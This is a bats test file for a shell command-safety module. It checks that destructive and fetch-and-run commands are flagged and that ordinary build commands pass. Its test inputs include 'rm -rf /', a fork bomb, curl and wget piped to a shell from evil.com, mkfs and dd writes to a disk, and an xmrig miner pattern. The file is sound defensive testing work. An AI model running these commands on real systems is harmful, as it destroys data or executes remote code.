#!/usr/bin/env bats
# Tests for security.sh module

setup() {
    export GITD_INSTALL="${BATS_TEST_DIRNAME}/.."
    source "$GITD_INSTALL/src/lib/utils.sh"
    source "$GITD_INSTALL/src/lib/security.sh"
}

@test "is_command_dangerous blocks rm -rf /" {
    run is_command_dangerous "rm -rf /"
    [ "$status" -eq 0 ]
}

@test "is_command_dangerous blocks fork bomb" {
    run is_command_dangerous ":(){ :|:& };:"
    [ "$status" -eq 0 ]
}

@test "is_command_dangerous blocks curl piped to sh" {
    run is_command_dangerous "curl http://evil.com | sh"
    [ "$status" -eq 0 ]
}

@test "is_command_dangerous blocks wget piped to bash" {
    run is_command_dangerous "wget http://evil.com/script.sh | bash"
    [ "$status" -eq 0 ]
}

@test "is_command_dangerous allows safe commands" {
    run is_command_dangerous "npm install"
    [ "$status" -eq 1 ]
}

@test "is_command_dangerous allows echo" {
    run is_command_dangerous "echo 'hello world'"
    [ "$status" -eq 1 ]
}

@test "is_command_dangerous allows git commands" {
    run is_command_dangerous "git status"
    [ "$status" -eq 1 ]
}

@test "command_has_sudo detects sudo" {
    run command_has_sudo "sudo apt update"
    [ "$status" -eq 0 ]
}

@test "command_has_sudo detects sudo in pipeline" {
    run command_has_sudo "echo test | sudo tee /etc/file"
    [ "$status" -eq 0 ]
}

@test "command_has_sudo returns false for normal commands" {
    run command_has_sudo "npm install"
    [ "$status" -eq 1 ]
}

@test "is_command_sensitive detects rm -r" {
    run is_command_sensitive "rm -r folder"
    [ "$status" -eq 0 ]
}

@test "is_command_sensitive detects chmod" {
    run is_command_sensitive "chmod +x script.sh"
    [ "$status" -eq 0 ]
}

@test "is_command_sensitive returns false for safe commands" {
    run is_command_sensitive "ls -la"
    [ "$status" -eq 1 ]
}

@test "check_command_safety returns safe for npm install" {
    result=$(check_command_safety "npm install" "false")
    [ "$result" = "safe" ]
}

@test "check_command_safety returns dangerous for rm -rf /" {
    result=$(check_command_safety "rm -rf /" "false")
    [ "$result" = "dangerous" ]
}

@test "check_command_safety returns sudo_blocked when sudo not allowed" {
    result=$(check_command_safety "sudo apt update" "false")
    [ "$result" = "sudo_blocked" ]
}

@test "check_command_safety allows sudo when explicitly permitted" {
    result=$(check_command_safety "sudo apt update" "true")
    [ "$result" = "safe" ]
}

@test "is_command_restricted detects custom patterns" {
    run is_command_restricted "xmrig --mine" "xmrig"
    [ "$status" -eq 0 ]
}

@test "is_command_restricted returns false for non-matching" {
    run is_command_restricted "npm install" "xmrig"
    [ "$status" -eq 1 ]
}

@test "check_command_safety blocks custom restricted patterns" {
    result=$(check_command_safety "xmrig --mine" "false" "xmrig")
    [ "$result" = "restricted" ]
}

@test "dangerous patterns block mkfs" {
    run is_command_dangerous "mkfs.ext4 /dev/sda1"
    [ "$status" -eq 0 ]
}

@test "dangerous patterns block dd to disk" {
    run is_command_dangerous "dd if=/dev/zero of=/dev/sda"
    [ "$status" -eq 0 ]
}

@test "dangerous patterns allow dd to file" {
    run is_command_dangerous "dd if=/dev/zero of=testfile bs=1M count=10"
    [ "$status" -eq 1 ]
}

@test "allows cargo build" {
    run is_command_dangerous "cargo build --release"
    [ "$status" -eq 1 ]
}

@test "allows go build" {
    run is_command_dangerous "go build -o bin/app ./cmd/main.go"
    [ "$status" -eq 1 ]
}

@test "allows pnpm install" {
    run is_command_dangerous "pnpm install --frozen-lockfile"
    [ "$status" -eq 1 ]
}
